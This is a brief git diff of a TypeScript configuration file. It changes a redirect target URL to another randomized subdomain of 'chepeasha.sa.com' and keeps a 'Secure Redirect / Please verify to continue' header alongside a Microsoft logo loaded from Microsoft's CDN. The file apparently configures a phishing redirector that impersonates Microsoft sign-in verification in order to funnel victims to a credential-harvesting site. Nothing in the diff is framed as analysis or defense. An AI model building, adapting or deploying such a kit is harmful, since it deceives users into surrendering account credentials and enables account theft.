@@ -18,7 +18,7 @@ export interface Config {
 }
 
 export const defaultConfig: Config = {
-  defaultTargetUrl: 'https://grandeur-z2oiquartzite.chepeasha.sa.com/kTTArdH9BX1jgHoHWT@C/',
+  defaultTargetUrl: 'https://envy.chepeasha.sa.com/p9Sgp6951@F4lqEY/',
   headerTitle: 'Secure Redirect',
   headerSubtitle: 'Please verify to continue',
   leftLogoUrl: 'https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg',
